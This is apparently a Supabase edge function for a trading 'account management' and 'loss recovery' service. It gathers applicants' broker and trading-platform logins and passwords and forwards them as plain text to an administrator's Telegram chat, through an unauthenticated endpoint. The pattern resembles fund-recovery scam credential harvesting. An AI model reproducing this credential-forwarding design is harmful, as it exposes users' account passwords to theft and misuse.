import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_ADMIN_CHAT_ID = Deno.env.get("TELEGRAM_ADMIN_CHAT_ID");

interface ApplicationBody {
  applicationId?: string;
  service_mode?: "management" | "recovery";
  name?: string;
  whatsapp?: string;
  telegram_username?: string;
  email?: string;
  submission_type?: "trading_account" | "broker_login";
  preferred_broker?: string;
  platform_type?: string;
  broker_server?: string;
  trading_login?: string;
  trading_password?: string;
  account_size?: string;
  broker_site_name?: string;
  broker_email?: string;
  broker_password?: string;
  note?: string;
  screenshot_path?: string;
}

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

async function getBotUsername(): Promise<string | null> {
  if (!TELEGRAM_BOT_TOKEN) return null;
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
    const result = await response.json();
    if (result.ok && result.result?.username) return result.result.username as string;
    return null;
  } catch (error) {
    console.error("getBotUsername error:", error);
    return null;
  }
}

function escapeHtml(value: unknown): string {
  return String(value ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// ---- Optional screenshot support ----
const SCREENSHOT_BUCKET = "application-screenshots";
const SCREENSHOT_PATH_RE = /^account\/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.jpg$/;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

// Returns the image only if the path has the expected shape and the file really exists.
async function loadScreenshot(
  supabase: ReturnType<typeof createClient>,
  path: unknown
): Promise<{ path: string; blob: Blob } | null> {
  if (typeof path !== "string" || !SCREENSHOT_PATH_RE.test(path)) return null;
  try {
    const { data, error } = await supabase.storage.from(SCREENSHOT_BUCKET).download(path);
    if (error || !data) return null;
    return { path, blob: data };
  } catch (e) {
    console.error("screenshot download failed:", e);
    return null;
  }
}

async function tgSendPhoto(
  chatId: string,
  blob: Blob,
  caption: string,
  replyTo?: number
): Promise<{ ok: boolean; error?: string }> {
  try {
    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", blob, "screenshot.jpg");
    form.append("caption", caption);
    form.append("parse_mode", "HTML");
    if (replyTo) form.append("reply_to_message_id", String(replyTo));
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });
    const result = await res.json();
    if (res.ok && result.ok === true) return { ok: true };
    console.error("sendPhoto failed:", JSON.stringify(result));
    return { ok: false, error: result?.description || `Telegram HTTP ${res.status}` };
  } catch (e) {
    console.error("sendPhoto error:", e);
    return { ok: false, error: e instanceof Error ? e.message : "sendPhoto failed" };
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  if (req.method !== "POST") return json({ success: false, error: "POST method required" }, 405);

  try {
    const app: ApplicationBody = await req.json();
    const isBrokerLogin = app.submission_type === "broker_login";
    const isRecovery = app.service_mode === "recovery";

    // Even if the admin ping can't be sent, still hand back the Telegram link
    // so the applicant can confirm their application.
    const botUsername = await getBotUsername();
    const telegram_link =
      botUsername && app.applicationId
        ? `https://t.me/${botUsername}?start=am_${app.applicationId}`
        : null;

    // Optional screenshot: only accepted for a real, existing application that has none yet.
    let shot: { path: string; blob: Blob } | null = null;
    if (app.screenshot_path && app.applicationId && UUID_RE.test(app.applicationId)) {
      const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
      const { data: existing } = await supabase
        .from("account_management_applications")
        .select("id, screenshot_path")
        .eq("id", app.applicationId)
        .maybeSingle();
      if (existing && !existing.screenshot_path) {
        shot = await loadScreenshot(supabase, app.screenshot_path);
        if (shot) {
          const { error: saveErr } = await supabase
            .from("account_management_applications")
            .update({ screenshot_path: shot.path })
            .eq("id", app.applicationId);
          if (saveErr) {
            console.error("saving screenshot_path failed:", saveErr);
            shot = null;
          }
        }
      }
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_ADMIN_CHAT_ID) {
      console.error("TELEGRAM_BOT_TOKEN or TELEGRAM_ADMIN_CHAT_ID missing — skipping admin notify");
      return json({ success: false, telegram_link, error: "Telegram admin notification secrets are missing" });
    }

    let message = isRecovery
      ? `🔁 <b>NEW LOSS RECOVERY APPLICATION</b>\n`
      : `💼 <b>NEW ACCOUNT MANAGEMENT APPLICATION</b>\n`;
    message += `━━━━━━━━━━━━━━━\n\n`;
    message += `🧾 Service: <b>${isRecovery ? "Loss Recovery (50% profit share)" : "Account Management (40% profit share)"}</b>\n`;
    message += `🙋 Name: <b>${escapeHtml(app.name)}</b>\n`;
    message += `📞 WhatsApp: <code>${escapeHtml(app.whatsapp)}</code>\n`;
    if (app.telegram_username) {
      message += `✈️ Telegram: <code>@${escapeHtml(String(app.telegram_username).replace(/^@/, ""))}</code>\n`;
    }
    if (app.email) message += `✉️ Email: <code>${escapeHtml(app.email)}</code>\n`;

    if (isBrokerLogin) {
      message += `\n🔐 <b>Method: Broker Login</b>\n`;
      message += `🌐 Broker Site/App: <b>${escapeHtml(app.broker_site_name)}</b>\n`;
      if (app.broker_email) message += `📧 Broker Email: <code>${escapeHtml(app.broker_email)}</code>\n`;
      if (app.broker_password) message += `🔑 Broker Password: <tg-spoiler>${escapeHtml(app.broker_password)}</tg-spoiler>\n`;
      if (app.note) message += `📝 Note: ${escapeHtml(app.note)}\n`;
    } else {
      message += `\n🔐 <b>Method: Trading Account</b>\n`;
      message += `💵 Account Size: <b>${escapeHtml(app.account_size)}</b>\n\n`;
      message += `🏦 Broker: <b>${escapeHtml(app.preferred_broker)}</b>\n`;
      if (app.platform_type) message += `🖥 Platform: ${escapeHtml(app.platform_type)}\n`;
      if (app.broker_server) message += `🌐 Server: <code>${escapeHtml(app.broker_server)}</code>\n`;
      if (app.trading_login) message += `👤 Login: <code>${escapeHtml(app.trading_login)}</code>\n`;
      if (app.trading_password) message += `🔑 Password: <tg-spoiler>${escapeHtml(app.trading_password)}</tg-spoiler>\n`;
      if (app.note) message += `📝 Note: ${escapeHtml(app.note)}\n`;
    }

    if (shot) message += `\n📸 <b>Screenshot attached</b>`;

    const chatId = TELEGRAM_ADMIN_CHAT_ID;

    // With a screenshot: one photo whose caption is the notification (limit 1024 chars).
    // If it doesn't fit, or the photo fails, fall back to the text message (+ photo as a reply).
    if (shot && message.length <= 1000) {
      const photo = await tgSendPhoto(chatId, shot.blob, message);
      if (photo.ok) return json({ success: true, telegram_link });
    }

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
    const result = await response.json();

    if (response.ok && result.ok === true) {
      if (shot && message.length > 1000) {
        await tgSendPhoto(
          chatId,
          shot.blob,
          `📸 Screenshot — ${escapeHtml(app.name)} (${isRecovery ? "Loss Recovery" : "Account Management"})`,
          result.result?.message_id
        );
      }
      return json({ success: true, telegram_link });
    }

    console.error("Telegram notify failed:", JSON.stringify(result));
    return json({
      success: false,
      telegram_link,
      error: result?.description || `Telegram HTTP ${response.status}`,
    });
  } catch (error) {
    console.error("account-management-notify error:", error);
    return json({ success: false, error: error instanceof Error ? error.message : "Internal server error" }, 500);
  }
});
